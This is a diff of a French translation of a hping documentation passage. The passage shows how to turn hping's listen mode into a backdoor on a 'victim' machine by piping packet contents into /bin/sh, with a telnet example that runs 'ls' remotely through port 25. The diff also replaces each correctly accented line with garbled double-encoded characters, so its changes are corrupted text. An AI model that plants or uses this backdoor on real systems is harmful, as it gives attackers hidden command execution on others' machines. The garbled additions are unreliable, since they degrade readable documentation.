@@ -1,15 +1,15 @@
-hping peut être utilisé comme une backdoor (ndt : porte dérobée). Essayez
+hping peut Ãªtre utilisÃ© comme une backdoor (ndt : porte dÃ©robÃ©e). Essayez
 juste l'option -9 (--listen) et redirigez via un tube dans /bin/sh :
 
-Mettez hping en mode listen (ndt : d'écoute) sur le système victime.
+Mettez hping en mode listen (ndt : d'Ã©coute) sur le systÃ¨me victime.
 
 victim# hping -I eth0 -9 mysign | /bin/sh
 
-Chaque paquet qui contient "mysign" sera traité par hping, tous les octets
-qui suivent "mysign" dans les paquets seront envoyés dans la sortie
-standard, ainsi par exemple je serai capable d'exécuter des commandes en
+Chaque paquet qui contient "mysign" sera traitÃ© par hping, tous les octets
+qui suivent "mysign" dans les paquets seront envoyÃ©s dans la sortie
+standard, ainsi par exemple je serai capable d'exÃ©cuter des commandes en
 utilisant tous types de protocoles. Juste pour exemple je peux utiliser le
-démon smtpd pour exécuter 'ls' sur la victime.
+dÃ©mon smtpd pour exÃ©cuter 'ls' sur la victime.
 
 evil$ telnet victim 25
 
@@ -28,10 +28,10 @@ boot  dev    export  lib   lost+found  proc  sbin  usr
 : command not found
 
 Comme vous pouvez le voir j'utilise 'ls;' puisque sinon le shell recevra
-juste ls^M. Le ";" force l'exécution de la commande (du moins avec bash et
-zsh, vérifiez votre shell pour plus d'informations).
+juste ls^M. Le ";" force l'exÃ©cution de la commande (du moins avec bash et
+zsh, vÃ©rifiez votre shell pour plus d'informations).
 
-Ceci fonctionne avec tous les types de paquets IP valides non filtrés, le
-niveau supérieur de protocole importe peu.
+Ceci fonctionne avec tous les types de paquets IP valides non filtrÃ©s, le
+niveau supÃ©rieur de protocole importe peu.
 
 antirez <antirez@invece.org>
